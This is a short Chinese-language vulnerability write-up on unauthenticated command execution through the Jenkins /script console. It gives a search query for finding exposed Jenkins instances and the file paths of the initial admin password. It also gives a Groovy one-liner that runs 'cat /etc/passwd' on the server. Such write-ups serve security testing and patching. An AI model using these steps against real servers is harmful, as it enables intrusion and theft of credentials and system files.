# Jenkins script 未授权远程命令执行漏洞

## 漏洞描述

Jenkins 登录后访问 /script 页面，其中存在命令执行漏洞，当存在未授权的情况时导致服务器被入侵

## 漏洞影响

```
Jenkins
```

## 网络测绘

```
app="Jenkins"
```

## 漏洞复现

账号密码存在于：

```
Linux: /var/lib/jenkins/secrets/initialAdminPassword
Windows: C:\Users\RabbitMask\.jenkins\secrets\initialAdminPassword
```

登录后台，或在未授权的情况下访问

```
http://xxx.xxx.xxx.xxx/script
```

在脚本命命令模块执行系统命令

```
println "cat /etc/passwd".execute().text
```

![image-20220525163148014](images/202205251631073.png)
